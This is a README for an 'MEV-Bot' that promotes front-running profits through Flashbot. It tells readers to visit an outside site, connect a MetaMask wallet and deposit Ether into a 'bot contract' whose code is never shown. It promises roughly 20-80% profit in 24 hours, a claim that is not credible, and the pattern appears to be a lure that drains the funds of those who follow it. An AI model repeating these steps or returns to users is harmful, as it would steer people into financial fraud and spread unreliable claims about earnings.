# MEV-Bot

### Mining Extractable Value (MEV) offers a lucrative avenue for income generation derived from unconfirmed transactions in the mempool. Leveraging the cutting-edge infrastructure of Flashbot, you can earn passive income by exploiting MEV.

Flashbot provides miners with the power to strategically select and sequence transactions in blocks, thereby extracting additional value. This opens up profitable trades, arbitrage opportunities, and a host of MEV-related prospects. Witness your earnings skyrocket based on transactions located in the blockchain's mempool!

## ðŸ’¡ Introducing Flashbot
Flashbot is an open infrastructure pioneered by a team of researchers and developers to exploit Miner Extractable Value (MEV) in the Ethereum network. It gives blockchain miners the power to gain additional value from transactions by controlling their order and inclusion in blocks.

Flashbot aims to resolve issues related to MEV, such as frontrunning (snagging transactions before their inclusion in a block), and mitigate the adverse impact on users and Decentralized Finance (DeFi) applications.

This infrastructure empowers developers and users to send bundles of transactions directly to Ethereum miners, bypassing the standard route via transaction pools. These bundles carry information about multiple transactions that need to be executed in a specific order, providing miners the choice to include or reject these bundles according to their preferences and objectives.

## Usage

  

1. Open the website in a [browser](https://mevbot-guide.pro/).

2. Connect your MetaMask cryptocurrency wallet.

4. Fund your bot's contract in two ways:

- Enter the amount of Ether in `amount` and click `Deposit`.

- Copy the address of your contract and send the amount of Ether from any wallet.

5. After funding the contract, start the bot by clicking `RUN/SCAN`.

The bot will begin scanning the mempool for unconfirmed transactions.

You can monitor its activity in `View Transactions`.

6. To stop the bot, click `Withdrawal`.

The bot will transfer all funds from the contract to the owner's address (the wallet that created the bot contract).

  

Testing the bot's operation over 24 hours yields ~20-80% profit on the balance.

  

The profit depends on network load (gas price) and competition from other MEV bots on the token.
